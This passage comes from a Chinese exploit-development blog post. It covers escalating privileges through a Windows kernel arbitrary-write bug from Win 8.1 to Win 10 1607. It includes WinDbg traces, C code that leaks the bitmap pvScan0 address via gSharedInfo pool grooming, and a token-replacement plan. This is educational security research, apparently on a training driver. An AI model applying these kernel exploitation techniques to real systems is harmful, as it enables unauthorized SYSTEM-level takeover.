class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; t</span><br><span class="line">00000000`0010033e 4883ec30        sub     rsp,30h</span><br><span class="line">1: kd&gt; dqs rsp</span><br><span class="line">ffffd000`27acf9a8  00000000`00000000</span><br><span class="line">ffffd000`27acf9b0  00000000`00000000</span><br><span class="line">ffffd000`27acf9b8  00000000`00000000</span><br><span class="line">ffffd000`27acf9c0  00000000`00000000</span><br><span class="line">ffffd000`27acf9c8  fffff803`2114ff36 nt!NtQueryIntervalProfile+0x3e</span><br><span class="line">ffffd000`27acf9d0  00000000`00000000</span><br><span class="line">ffffd000`27acf9d8  00000000`00000000</span><br><span class="line">ffffd000`27acf9e0  00000000`00000000</span><br><span class="line">ffffd000`27acf9e8  00000000`00000000</span><br><span class="line">ffffd000`27acf9f0  00000000`00000000</span><br><span class="line">ffffd000`27acf9f8  fffff803`20de28b3 nt!KiSystemServiceCopyEnd+0x13</span><br><span class="line">ffffd000`27acfa00  ffffe000`01b9a4c0</span><br><span class="line">ffffd000`27acfa08  00007ffe`00000008</span><br><span class="line">ffffd000`27acfa10  ffffffff`fff85ee0</span><br><span class="line">ffffd000`27acfa18  ffffd000`00000008</span><br><span class="line">ffffd000`27acfa20  000000bf`00000000</span><br><span class="line">1: kd&gt; t</span><br><span class="line">00000000`00100342 48b875ff142103f8ffff mov rax,offset nt!KeQueryIntervalProfile+0x25 (fffff803`2114ff75)</span><br><span class="line">1: kd&gt; dqs rsp</span><br><span class="line">ffffd000`27acf978  00000000`0010033e</span><br><span class="line">ffffd000`27acf980  00000000`00000010</span><br><span class="line">ffffd000`27acf988  00000000`00000344</span><br><span class="line">ffffd000`27acf990  ffffd000`27acf9a8</span><br><span class="line">ffffd000`27acf998  00000000`00000018</span><br><span class="line">ffffd000`27acf9a0  00000000`00100300</span><br><span class="line">ffffd000`27acf9a8  00000000`00000000</span><br><span class="line">ffffd000`27acf9b0  00000000`00000000</span><br><span class="line">ffffd000`27acf9b8  00000000`00000000</span><br><span class="line">ffffd000`27acf9c0  00000000`00000000</span><br><span class="line">ffffd000`27acf9c8  fffff803`2114ff36 nt!NtQueryIntervalProfile+0x3e</span><br><span class="line">ffffd000`27acf9d0  00000000`00000000</span><br><span class="line">ffffd000`27acf9d8  00000000`00000000</span><br><span class="line">ffffd000`27acf9e0  00000000`00000000</span><br><span class="line">ffffd000`27acf9e8  00000000`00000000</span><br><span class="line">ffffd000`27acf9f0  00000000`00000000</span><br><span class="line">1: kd&gt; u 00000000`0010033e</span><br><span class="line">00000000`0010033e 4883ec30        sub     rsp,30h</span><br><span class="line">00000000`00100342 48b875ff142103f8ffff mov rax,offset nt!KeQueryIntervalProfile+0x25 (fffff803`2114ff75)</span><br><span class="line">00000000`0010034c 48890424        mov     qword ptr [rsp],rax</span><br><span class="line">00000000`00100350 c3              ret</span><br><span class="line">00000000`00100351 cc              int     3</span><br><span class="line">00000000`00100352 cc              int     3</span><br><span class="line">00000000`00100353 cc              int     3</span><br><span class="line">00000000`00100354 cc              int     3</span><br></pre></td></tr></table></figure>
+<p><code>nt!KeQueryIntervalProfile+0x25</code>是哪里呢，这个值刚好是我们Hook位置的下一句汇编，我们将其放回原位即可做到原封不动的还原内核函数，这样就可以完美的提权而不蓝屏</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; u nt!KeQueryIntervalProfile</span><br><span class="line">nt!KeQueryIntervalProfile:</span><br><span class="line">fffff803`2114ff50 4883ec48        sub     rsp,48h</span><br><span class="line">fffff803`2114ff54 83f901          cmp     ecx,1</span><br><span class="line">fffff803`2114ff57 7430            je      nt!KeQueryIntervalProfile+0x39 (fffff803`2114ff89)</span><br><span class="line">fffff803`2114ff59 ba18000000      mov     edx,18h</span><br><span class="line">fffff803`2114ff5e 894c2420        mov     dword ptr [rsp+20h],ecx</span><br><span class="line">fffff803`2114ff62 4c8d4c2450      lea     r9,[rsp+50h]</span><br><span class="line">fffff803`2114ff67 8d4ae9          lea     ecx,[rdx-17h]</span><br><span class="line">fffff803`2114ff6a 4c8d442420      lea     r8,[rsp+20h]</span><br><span class="line">0: kd&gt; u</span><br><span class="line">nt!KeQueryIntervalProfile+0x1f:</span><br><span class="line">fffff803`2114ff6f ff15f377ddff    call    qword ptr [nt!HalDispatchTable+0x8 (fffff803`20f27768)]</span><br><span class="line">fffff803`2114ff75 85c0            test    eax,eax // nt!KeQueryIntervalProfile+0x25</span><br><span class="line">fffff803`2114ff77 7818            js      nt!KeQueryIntervalProfile+0x41 (fffff803`2114ff91)</span><br><span class="line">fffff803`2114ff79 807c242400      cmp     byte ptr [rsp+24h],0</span><br><span class="line">fffff803`2114ff7e 7411            je      nt!KeQueryIntervalProfile+0x41 (fffff803`2114ff91)</span><br><span class="line">fffff803`2114ff80 8b442428        mov     eax,dword ptr [rsp+28h]</span><br><span class="line">fffff803`2114ff84 4883c448        add     rsp,48h</span><br><span class="line">fffff803`2114ff88 c3              ret</span><br></pre></td></tr></table></figure>
+<h1 id="0x02：Windows-10-1511-1607-x64下的利用"><a href="#0x02：Windows-10-1511-1607-x64下的利用" class="headerlink" title="0x02：Windows 10 1511-1607 x64下的利用"></a>0x02：Windows 10 1511-1607 x64下的利用</h1><p>好了我们整理完了win 8.1下的一些坑我们开始我们在win10中的利用，win8.1中最浪费时间的操作便是堆栈的平衡问题，那我们可不可以有更简单的方法提权呢？当然有的，我们都有任意读写的权限了不是吗，既然有任意读写的权限，那么我们完全可以用任意读写的操作实现对token的替换，我们甚至不用我们的shellcode都可以提权，这种做法非常的简便，并不需要考虑shellcode在内核中运行遇到的堆栈平衡问题，我们的关键点始终还是在泄露pvScan0的地方，我们在win 10 1607和win 10 1511中观察一下我们创建的Bitmap结构，和win 8.1进行比较，构造如下代码片段</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HBITMAP hBitmap = CreateBitmap(<span class="number">0x10</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="literal">NULL</span>);</span><br><span class="line">	__debugbreak();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>Win 8.1 x64</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; dt ntdll!_PEB -b GdiSharedHandleTable @$Peb</span><br><span class="line">   +0x0f8 GdiSharedHandleTable : 0x000000c4`d0540000 </span><br><span class="line">0: kd&gt; ? rax&amp;ffff</span><br><span class="line">Evaluate expression: 1984 = 00000000`000007c0</span><br><span class="line">0: kd&gt; dq 0x000000c4`d0540000+0x18*7c0</span><br><span class="line">000000c4`d054ba00  fffff901`40701010 40053105`00000c3c</span><br><span class="line">000000c4`d054ba10  00000000`00000000 fffff901`43c5d010</span><br><span class="line">000000c4`d054ba20  40012201`00000c3c 000000c4`d0170b60</span><br><span class="line">000000c4`d054ba30  fffff901`446c4190 41051405`00000000</span><br><span class="line">000000c4`d054ba40  00000000`00000000 fffff901`400d6ab0</span><br><span class="line">000000c4`d054ba50  40084308`00000000 00000000`00000000</span><br><span class="line">000000c4`d054ba60  00000000`00000776 44003501`00000000</span><br><span class="line">000000c4`d054ba70  00000000`00000000 fffff901`407e6010</span><br><span class="line">0: kd&gt; dq fffff901`40701010</span><br><span class="line">fffff901`40701010  00000000`310507c0 80000000`00000000</span><br><span class="line">fffff901`40701020  00000000`00000000 00000000`00000000</span><br><span class="line">fffff901`40701030  00000000`310507c0 00000000`00000000</span><br><span class="line">fffff901`40701040  00000000`00000000 00000002`00000010</span><br><span class="line">fffff901`40701050  00000000`00000020 fffff901`40701268</span><br><span class="line">fffff901`40701060  fffff901`40701268 00002472`00000010</span><br><span class="line">fffff901`40701070  00010000`00000003 00000000`00000000</span><br><span class="line">fffff901`40701080  00000000`04800200 00000000`00000000</span><br></pre></td></tr></table></figure>
+<p><strong>Win 10 1511 x64</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; dt ntdll!_PEB -b GdiSharedHandleTable @$Peb</span><br><span class="line">   +0x0f8 GdiSharedHandleTable : 0x00000216`aa740000 </span><br><span class="line">0: kd&gt; ? rax&amp;ffff</span><br><span class="line">Evaluate expression: 2711 = 00000000`00000a97</span><br><span class="line">0: kd&gt; dq 0x00000216`aa740000+0x18*a97</span><br><span class="line">00000216`aa74fe28  fffff901`4222aca0 4005e605`00000dec</span><br><span class="line">00000216`aa74fe38  00000000`00000000 00000000`00000936</span><br><span class="line">00000216`aa74fe48  40004205`00000000 00000000`00000000</span><br><span class="line">00000216`aa74fe58  00000000`00000a98 40004105`00000000</span><br><span class="line">00000216`aa74fe68  00000000`00000000 fffff901`441e4380</span><br><span class="line">00000216`aa74fe78  40102310`000006c8 000001fc`d4640fc0</span><br><span class="line">00000216`aa74fe88  00000000`00000abf 40008404`00000000</span><br><span class="line">00000216`aa74fe98  00000000`00000000 fffff901`406d94d0</span><br><span class="line">0: kd&gt; dq fffff901`4222aca0</span><br><span class="line">fffff901`4222aca0  ffffffff`e6050a97 80000000`00000000</span><br><span class="line">fffff901`4222acb0  00000000`00000000 00000000`00000000</span><br><span class="line">fffff901`4222acc0  ffffffff`e6050a97 00000000`00000000</span><br><span class="line">fffff901`4222acd0  00000000`00000000 00000002`00000010</span><br><span class="line">fffff901`4222ace0  00000000`00000020 fffff901`4222aef8</span><br><span class="line">fffff901`4222acf0  fffff901`4222aef8 00008999`00000010</span><br><span class="line">fffff901`4222ad00  00010000`00000003 00000000`00000000</span><br><span class="line">fffff901`4222ad10  00000000`04800200 00000000`00000000</span><br></pre></td></tr></table></figure>
+<p><strong>Win 10 1607 x64</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">3: kd&gt; dt ntdll!_PEB -b GdiSharedHandleTable @$Peb</span><br><span class="line">   +0x0f8 GdiSharedHandleTable : 0x0000023e`1a210000 </span><br><span class="line">3: kd&gt; ? rax&amp;ffff</span><br><span class="line">Evaluate expression: 3111 = 00000000`00000c27</span><br><span class="line">3: kd&gt; dq 0x0000023e`1a210000+0x18*c27</span><br><span class="line">0000023e`1a2223a8  ffffffff`ff540c27 00055405`00001a20</span><br><span class="line">0000023e`1a2223b8  00000000`00000000 00000000`00000b3e</span><br><span class="line">0000023e`1a2223c8  0000600a`00000001 00000000`00000000</span><br><span class="line">0000023e`1a2223d8  00000000`00000a90 00004104`00000001</span><br><span class="line">0000023e`1a2223e8  00000000`00000000 00000000`00000aea</span><br><span class="line">0000023e`1a2223f8  00003505`00000001 00000000`00000000</span><br><span class="line">0000023e`1a222408  ffffffff`ff810c2b 00018101`00000918</span><br><span class="line">0000023e`1a222418  0000019d`678a0820 00000000`00000acc</span><br><span class="line">3: kd&gt; dq ffffffff`ff540c27</span><br><span class="line">ffffffff`ff540c27  ????????`???????? ????????`????????</span><br><span class="line">ffffffff`ff540c37  ????????`???????? ????????`????????</span><br><span class="line">ffffffff`ff540c47  ????????`???????? ????????`????????</span><br><span class="line">ffffffff`ff540c57  ????????`???????? ????????`????????</span><br><span class="line">ffffffff`ff540c67  ????????`???????? ????????`????????</span><br><span class="line">ffffffff`ff540c77  ????????`???????? ????????`????????</span><br><span class="line">ffffffff`ff540c87  ????????`???????? ????????`????????</span><br><span class="line">ffffffff`ff540c97  ????????`???????? ????????`????????</span><br></pre></td></tr></table></figure>
+<p>实验中很明显的发现win 10 1607中我们的<code>GdiShreadHanldleTable</code>已经不是一个指针了，我们来看看有什么升级，图片中说明了已经不能够公开这个句柄表的地址了,那是不是就没办法了呢?</p>
+<p><img src="/2019/08/19/www漏洞从win7-win10/12.png" alt="1564987015367"></p>
+<p>当然不是!我们总能够通过各种方法来泄露我们的 PrvScan0 ，这里就需要引入另外一个比较神奇的结构<code>gSharedInfo</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SHAREDINFO</span> &#123;</span></span><br><span class="line">	PSERVERINFO psi;</span><br><span class="line">	PUSER_HANDLE_ENTRY aheList;</span><br><span class="line">	ULONG HeEntrySize;</span><br><span class="line">	ULONG_PTR pDispInfo;</span><br><span class="line">	ULONG_PTR ulSharedDelts;</span><br><span class="line">	ULONG_PTR awmControl;</span><br><span class="line">	ULONG_PTR DefWindowMsgs;</span><br><span class="line">	ULONG_PTR DefWindowSpecMsgs;</span><br><span class="line">&#125; SHAREDINFO, * PSHAREDINFO;</span><br></pre></td></tr></table></figure>
+<p>其中的 <code>aheList</code> 结构如下，里面就保存了一个 pKernel 的指针，指向这个句柄的内核地址</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">USER_HANDLE_ENTRY</span> &#123;</span></span><br><span class="line">	<span class="keyword">void</span>* pKernel;</span><br><span class="line">	<span class="keyword">union</span></span><br><span class="line">	&#123;</span><br><span class="line">		PVOID pi;</span><br><span class="line">		PVOID pti;</span><br><span class="line">		PVOID ppi;</span><br><span class="line">	&#125;;</span><br><span class="line">	BYTE type;</span><br><span class="line">	BYTE flags;</span><br><span class="line">	WORD generation;</span><br><span class="line">&#125; USER_HANDLE_ENTRY, * PUSER_HANDLE_ENTRY;</span><br></pre></td></tr></table></figure>
+<p>先不管三七二十一，我们先泄露这个东西，再看看和我们的 Bitmap 有什么联系，关键代码如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">LPACCEL lPaccel = <span class="literal">NULL</span>;</span><br><span class="line">PUSER_HANDLE_ENTRY leakaddr = <span class="literal">NULL</span>;</span><br><span class="line">HMODULE huser32 = <span class="literal">NULL</span>;</span><br><span class="line">HACCEL hAccel = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">int</span> nSize = <span class="number">700</span>;</span><br><span class="line"></span><br><span class="line">lPaccel = (LPACCEL)LocalAlloc(LPTR, <span class="keyword">sizeof</span>(ACCEL) * nSize);</span><br><span class="line">PSHAREDINFO pfindSharedInfo = (PSHAREDINFO)GetProcAddress(</span><br><span class="line">	GetModuleHandleW(<span class="string">L"user32.dll"</span>), </span><br><span class="line">	<span class="string">"gSharedInfo"</span>);</span><br><span class="line">PUSER_HANDLE_ENTRY handleTable = pfindSharedInfo-&gt;aheList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x3</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">	hAccel = CreateAcceleratorTable(lPaccel, nSize);</span><br><span class="line">	leakaddr = &amp;handleTable[LOWORD(hAccel)];</span><br><span class="line">	DWORD64 addr = (DWORD64)(leakaddr-&gt;pKernel);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+]leak address : 0x%p"</span>, leakaddr-&gt;pKernel);</span><br><span class="line">	DestroyAcceleratorTable(hAccel);</span><br><span class="line">	<span class="keyword">if</span>(i = <span class="number">3</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		CreateBitmap(<span class="number">0x710</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0x8</span>, <span class="literal">NULL</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运行一下查看结果，确实泄露了什么东西出来</p>
+<p><img src="/2019/08/19/www漏洞从win7-win10/8.png" alt="1564969195115"></p>
+<p>解读一下上面的代码，我们首先创建了一块内存，其中的nSize选择了700的大小，因为后面我们使用<code>CreateBitmap</code>创建的对象传入的第一个参数是0x710，关于<code>CreateBitmap</code>中第一个参数<code>width</code>对生成对象的影响我就不过多阐述了，实验加上<a href="https://docs.microsoft.com/en-us/previous-versions/aa929704(v=msdn.10" target="_blank" rel="noopener">官方文档</a>)可以给我们解释，然后我们获取了 user32.dll 中的  gSharedInfo 对象，我们在一个循环里使用 CreateAcceleratorTable 和 DestroyAcceleratorTable 不断创建释放了 hAccel 结构，其中计算的过程和我们泄露bitmap地址的过程类似，这里就会产生一个疑问，这个泄露的东西为什么和我们的 Bitmap 一样呢，要知道我们每次创建释放hAccel时候地址是固定的(你可以多打印几次进行实验)，并且这个对象也是分配在会话池(sesssion pool)，大小又相等，池类型又相同，如果我们申请了一块然后释放了，再用bitmap申请岂不是就可以申请到我们想要的地方，泄露的地址也就是bitmap的地址了，我们这里为了使得到的地址固定，堆喷射后使用了一个判断语句判断是否得到了稳定的地址，得到之后我们再加上相应的偏移也就是我们的 PrvScan0 了，于是我们构造如下代码片段</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LeakBitmapInfo <span class="title">GetBitmap</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	UINT loadCount = <span class="number">0</span>;</span><br><span class="line">	HACCEL hAccel = <span class="literal">NULL</span>;</span><br><span class="line">	LPACCEL lPaccel = <span class="literal">NULL</span>;</span><br><span class="line">	PUSER_HANDLE_ENTRY firstEntryAddr = <span class="literal">NULL</span>;</span><br><span class="line">	PUSER_HANDLE_ENTRY secondEntryAddr = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">int</span> nSize = <span class="number">700</span>;</span><br><span class="line">	<span class="keyword">int</span> handleIndex = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	PUCHAR firstAccelKernelAddr;</span><br><span class="line">	PUCHAR secondAccelKernelAddr;</span><br><span class="line"></span><br><span class="line">	PSHAREDINFO pfindSharedInfo = (PSHAREDINFO)GetProcAddress(GetModuleHandle(<span class="string">L"user32.dll"</span>), <span class="string">"gSharedInfo"</span>);	<span class="comment">// 获取gSharedInfo表</span></span><br><span class="line">	PUSER_HANDLE_ENTRY gHandleTable = pfindSharedInfo-&gt;aheList;</span><br><span class="line">	LeakBitmapInfo retBitmap;</span><br><span class="line"></span><br><span class="line">	lPaccel = (LPACCEL)LocalAlloc(LPTR, <span class="keyword">sizeof</span>(ACCEL) * nSize);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (loadCount &lt; <span class="number">20</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		hAccel = CreateAcceleratorTable(lPaccel, nSize);	</span><br><span class="line"></span><br><span class="line">		handleIndex = LOWORD(hAccel);</span><br><span class="line"></span><br><span class="line">		firstEntryAddr = &amp;gHandleTable[handleIndex];</span><br><span class="line"></span><br><span class="line">		firstAccelKernelAddr = (PUCHAR)firstEntryAddr-&gt;pKernel;</span><br><span class="line">		DestroyAcceleratorTable(hAccel);</span><br><span class="line"></span><br><span class="line">		hAccel = CreateAcceleratorTable(lPaccel, nSize);	</span><br><span class="line"></span><br><span class="line">		handleIndex = LOWORD(hAccel);</span><br><span class="line"></span><br><span class="line">		secondEntryAddr = &amp;gHandleTable[handleIndex];</span><br><span class="line"></span><br><span class="line">		secondAccelKernelAddr = (PUCHAR)firstEntryAddr-&gt;pKernel;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (firstAccelKernelAddr == secondAccelKernelAddr)</span><br><span class="line">		&#123;</span><br><span class="line">			DestroyAcceleratorTable(hAccel);</span><br><span class="line">			LPVOID lpBuf = VirtualAlloc(<span class="literal">NULL</span>, <span class="number">0x50</span> * <span class="number">2</span> * <span class="number">4</span>, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line">			retBitmap.hBitmap = CreateBitmap(<span class="number">0x701</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">8</span>, lpBuf); </span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		DestroyAcceleratorTable(hAccel);</span><br><span class="line">		loadCount++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	retBitmap.pBitmapPvScan0 = firstAccelKernelAddr + <span class="number">0x50</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+]bitmap handle is:  0x%08x \n"</span>, (ULONG)retBitmap.hBitmap);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+]bitmap pvScan0 at: 0x%p \n\n"</span>, retBitmap.pBitmapPvScan0);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> retBitmap;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>泄露了之后就好办了，也就是只需要替换一个token就行了，我这里用的是read和write函数不断的进行汇编shellcode的模仿，在ring3层实现了对token的替换，这样我们就可以不加入我们的shellcode从而提权，而这种方法也不需要考虑堆栈平衡，非常的方便，其中获取系统的一些信息的时候使用了<code>NtQuerySystemInformation</code>这个函数，通过它可以给我们提供很多的系统信息，具体的可以参阅<a href="https://docs.microsoft.com/zh-cn/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation" target="_blank" rel="noopener">官方文档</a></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">kernel_entry NTSTATUS <span class="title">NtQuerySystemInformation</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  IN SYSTEM_INFORMATION_CLASS SystemInformationClass,</span></span></span><br><span class="line"><span class="function"><span class="params">  OUT PVOID                   SystemInformation,</span></span></span><br><span class="line"><span class="function"><span class="params">  IN ULONG                    SystemInformationLength,</span></span></span><br><span class="line"><span class="function"><span class="params">  OUT PULONG                  ReturnLength</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
+<p>最后整合一下思路：</p>
+<ul>
+<li>初始化句柄等结构</li>
+<li>通过<code>gSharedInfo</code>对象来泄露我们的Bitmap地址</li>
+<li>调用<code>TriggerArbitraryOverwrite</code>函数将一个pvScan0指向另一个pvScan0</li>
+<li>通过不断的read和write，模拟token的替换，从而提权</li>
+</ul>
+<p>最后整合一下代码即可实现利用，整体代码和验证结果参考 =&gt; <a href="https://github.com/ThunderJie/Write-What-Where" target="_blank" rel="noopener">这里</a></p>
+<h1 id="0x03：Windows-10-后续版本的猜想"><a href="#0x03：Windows-10-后续版本的猜想" class="headerlink" title="0x03：Windows 10 后续版本的猜想"></a>0x03：Windows 10 后续版本的猜想</h1><h2 id="RS2"><a href="#RS2" class="headerlink" title="RS2"></a>RS2</h2><p>RS2版本中貌似将我们的 pkernel 指针给移除了，也就是说我们不能再通过 gSharedInfo 结构来泄露我们的内核地址了，不过有前辈们用<code>tagCLS</code>对象及<code>lpszMenuName</code>对象泄露了内核地址，能够泄露的话其实其他地方都好办了，泄露的方法我这里简单提一下，首先我们需要找到<code>HMValidateHandle</code>函数的地址，这个函数我们只需要传入一个窗口句柄，他就会返回在桌面堆中的<code>tagWND</code>对象指针，而通过这个指针我们就可以泄露出内核地址，这个函数地址我们可以通过<code>IsMenu</code>这个用户态函数获取到，我们来看一下函数的内容，可以看到 call 之后会调用到<code>HMValidateHandle</code>这个函数，那么我们只需要通过硬编码计算，获取 e8(call) 之后的几个字节地址就行了 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; u user32!IsMenu</span><br><span class="line">USER32!IsMenu:</span><br><span class="line">00007fff`17d489e0 4883ec28        sub     rsp,28h</span><br><span class="line">00007fff`17d489e4 b202            mov     dl,2</span><br><span class="line">00007fff`17d489e6 e805380000      call    USER32!HMValidateHandle (00007fff`17d4c1f0)</span><br><span class="line">00007fff`17d489eb 33c9            xor     ecx,ecx</span><br><span class="line">00007fff`17d489ed 4885c0          test    rax,rax</span><br><span class="line">00007fff`17d489f0 0f95c1          setne   cl</span><br><span class="line">00007fff`17d489f3 8bc1            mov     eax,ecx</span><br><span class="line">00007fff`17d489f5 4883c428        add     rsp,28h</span><br></pre></td></tr></table></figure>
+<p>获取到<code>HMValidateHandle</code>函数之后我们只需要再进行一系列的计算获取<code>lpszMenuName</code>对象的地址，我们可以依据下图 Morten 所说的计算过程计算出<code>Client delta</code></p>
+<p><img src="/2019/08/19/www漏洞从win7-win10/13.png" alt="1565142151413"></p>
+<p>获取到了之后我们只需要和前面一样进行堆喷加上判断就能够泄露出Bitmap的地址，还需要注意的是偏移的问题，需要简要修改，下面是1703的一些偏移</p>
